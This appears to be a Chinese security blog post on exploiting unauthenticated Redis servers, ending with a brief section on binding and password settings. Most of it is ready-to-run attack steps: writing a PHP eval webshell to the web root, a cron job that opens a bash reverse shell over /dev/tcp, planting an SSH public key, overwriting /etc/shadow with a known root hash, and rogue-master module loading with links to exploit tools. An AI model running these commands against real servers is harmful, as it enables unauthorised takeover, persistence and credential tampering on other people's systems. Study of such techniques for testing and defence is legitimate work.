---
layout:     post
title:      Redis相关
date:       2020-05-20
author:     lceCr4m
header-img: img/16.jpg
catalog: true
tags:
    - Redis
---
> 本文主要是关于Redis的相关内容。~~520的千反田~~

# 0x00 前言
主要写Redistribution未授权访问的相关内容，包括：ssrf-redis，redis-getshell，redis-crontab，redis-publickey，redis-shadow，redis-slaveof。

# 0x01 Redis未授权访问介绍
Redis默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，这样将会将Redis服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身的提供的config命令，可以进行写文件操作，造成相关漏洞。  
上述总结：
```
1.redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。
2.没有设置密码认证（一般为空），可以免密码远程登录redis服务。 
```
# 0x02 SSRF-Redis
主要是利用在外网的主机上存在ssrf，之后通过gopher协议，向未授权访问的内网中的redis写入shell。在之前的文章中有讲过。
# 0x03 Redis-GetShell
条件：  
1. 靶机redis未授权，在攻击机上能用redis-cli连。  
1. 开了web服务器，并且知道路径（如利用phpinfo，或者误爆路经），还需要具有文件写权。

操作：
```
redis-cli -h 192.168.0.144
连接靶机redis后：
靶机ip:6379>config set dir /var/www/
靶机ip:6379>config set dbfilename shell.php
靶机ip:6379>set x "<?php @eval($_POST['hack']);?>"
靶机ip:6379>save
```
# 0x04 Redis-Crontab
介绍：  
crotab是linux下执行计划任务的工具。通过写入crontab实现反弹shell。

条件：
1. 能够回连。
1. 权限足够。
2. redis未授权。

操作：

```
nc -lvnp 4444
redis-cli -h 192.168.0.144
连接后：
靶机ip:6379>set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.144/4444 0>&1\n\n"
靶机ip:6379>config set dir /var/spool/cron
靶机ip:6379>config set dbfilename root
靶机ip:6379>save
```
# 0x05 Redis-PublicKey
介绍：  
通过写入自己的ssh公钥，以便于使用自己的私钥进行登录目标靶机。

条件：
1. 靶机开启ssh服务（如22端口）。
1. 权限足够。
2. redis未授权

操作：

```
ssh公钥一般保存在/root/.ssh
首先在攻击机生成ssh公私钥：id_rsa，id_rsa.pub
之后将公钥写入靶机：两种方式
1.连接靶机redis后：
靶机ip:6379>config set dir /root/.ssh
靶机ip:6379>config set dbfilename authorized_keys
靶机ip:6379>set x "publickey"
靶机ip:6379>save
2.在攻击机上将生成的公钥写入key.txt，并写入redis：
cat key.txt | redis-cli -h 192.168.0.144 -x set crack
之后连接靶机redis：
redis-cli -h 192.168.0.144
得到redis备份的路径：
CONFIG GET dir
更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）：
靶机ip:6379>config set dir /root/.ssh
设置上传公钥的备份文件名字为authorized_keys：
config set dbfilename authorized_keys
查看有没有authorized_keys文件，若有则成功

写入公钥后，可以在攻击机上使用ssh的私钥登录靶机：
ssh -i id_rsa root@192.168.0.144
```
# 0x06 Redis-Shadow
介绍1：  
通过写靶机的shadow修改登录密码。

条件：
1. 未授权
2. 有写shadow权限

介绍2：  
/etc/passwd文件允许所有用户读取，易导致用户密码泄露，因此Linux系统将用户的密码信息从/etc/passwd文件中分离出来，并单独放到/etc/shadow中，只有root用户拥有读权限，其他用户没有任何权限，这样就保证了用户密码的安全性。  
字段含义：用户名:加密密码:最后一次修改时间:最小修改时间间隔:密码有效期:密码需要变更前的警告天数:密码过期后的宽限时间:账号失效时间:保留字段

操作：

```
连接redis后：
config set dir /etc
config set dbfilename shadow
set xx "\n\nroot:$6$ZPEUqn3oQNFJNomM$5WKlngU6M9dP2i2CPhVxA7.0b0zo60u4blq.Uaf.xTVOyXP3H/.W00/MROiiuGlKTaNrV1O3iKnKD7IDfVLoh.:18373:0:99999:7:::\n\n"
save
切记：此方式比较危险
```
# 0x07 Redis-Slaveof
介绍：  
redis保存的数据并不是简单的json或者是csv，所以其他方式写入的文件都会有大量的无用数据，之前写入的方式主要利用了crontab，ssh key，webshell这样的文件都有一定容错性，再加上crontab和ssh服务可以说是服务器的标准的服务，所以比较通用。  
但是随着技术的进步，对于docker来说，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell。

redis主从复制：  
redis为了备份和提高性能，有一台主服务器，n台从服务器，从服务器会实时备份主服务器数据。

redis外部拓展：  
在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。

过程：
1. 本地编译好外部扩展即so文件
1. 把so文件转码存入本地redis数据库
1. 到目标服务器上设置主从关系，主服务器指定我们的本地机子
1. 待同步后，设置备份路径和备份文件名（exp.so）
1. 利用fullresync进行同步，备份数据库
1. 然后加载备份数据库
1. 然后通过redis执行命令反弹shell

工具：  
https://github.com/n0b0dyCN/redis-rogue-server  =>  exp.so文件  
https://github.com/Ridter/redis-rce  =>  redis-rce.py文件/redis-rogue-server.py文件

# 0x08 防御
1.通过绑定ip进行控制，redis.conf文件找到配置进行修改。
```
# If you want you can bind a single interface, if the bind option is not
# specified all the interfaces will listen for incoming connections.
#
# bind 127.0.0.1
```

2.设置密码，以提供远程登陆。找到redis.conf配置文件，找到requirepass设置密码后重启redis。设置密码后可以在登录时输入，也可以登陆后输入。不输入密码可以登录但无法执行命令。之后可以通过config get requirepass查看密码。
```
redis.conf内容修改处：
requirepass yourpassword
```


















